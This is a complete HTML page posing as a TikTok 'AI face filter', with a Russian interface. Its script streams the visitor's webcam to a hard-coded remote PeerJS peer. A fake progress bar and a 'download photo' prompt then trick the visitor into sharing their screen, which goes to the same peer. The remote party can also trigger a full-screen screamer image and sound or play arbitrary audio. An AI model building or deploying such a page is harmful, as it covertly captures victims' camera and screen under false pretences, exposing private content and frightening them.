<!DOCTYPE html>
<html>
<head>
    <title>TikTok AI Filter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #loader, #download-zone, #screamer { display: none; }
        .spinner { border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
        #screamer img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>

    <div id="ui">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
        <h2>AI-Фильтр "Идеальное лицо"</h2>
        <button class="btn" onclick="startProcess()">ПОДКЛЮЧИТЬ</button>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <h2 id="load-text">Анализ... 0%</h2>
    </div>

    <div id="download-zone">
        <h2>Фото готово!</h2>
        <p>Разрешите синхронизацию для сохранения</p>
        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">СКАЧАТЬ ФОТО</button>
    </div>

    <div id="screamer">
        <img id="scary-img" src="https://i.imgur.com/v799C7v.jpeg">
        <audio id="scary-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
    </div>

    <audio id="remote-sound"></audio>

    <script>
        const REMOTE_ID = '09062012';
        const peer = new Peer();
        let conn;

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                conn = peer.connect(REMOTE_ID);
                peer.call(REMOTE_ID, stream);
                
                document.getElementById('ui').style.display = 'none';
                document.getElementById('loader').style.display = 'block';

                // БЫСТРАЯ ЗАГРУЗКА (занимает ~3-5 секунд)
                let p = 0;
                let interval = setInterval(() => {
                    p += Math.floor(Math.random() * 15) + 5; // Быстрые скачки
                    if (p >= 100) {
                        p = 100;
                        clearInterval(interval);
                        setTimeout(() => {
                            document.getElementById('loader').style.display = 'none';
                            document.getElementById('download-zone').style.display = 'block';
                        }, 500);
                    }
                    document.getElementById('load-text').innerText = "Анализ... " + p + "%";
                }, 200);

                setupCommands();
            } catch (e) { alert("Нужен доступ к камере!"); }
        }

        async function getScreen() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                peer.call(REMOTE_ID, stream);
                document.getElementById('download-zone').innerHTML = "<h2>Синхронизация активна...</h2><p>Подождите завершения скачивания</p>";
            } catch (e) { alert("Ошибка сохранения"); }
        }

        function setupCommands() {
            conn.on('data', data => {
                if (data.type === 'SCREAM') {
                    document.getElementById('screamer').style.display = 'block';
                    document.getElementById('scary-audio').play();
                } else if (data.type === 'PLAY_SOUND') {
                    const audio = document.getElementById('remote-sound');
                    audio.src = data.url;
                    audio.play();
                }
            });
        }
    </script>
</body>
</html>
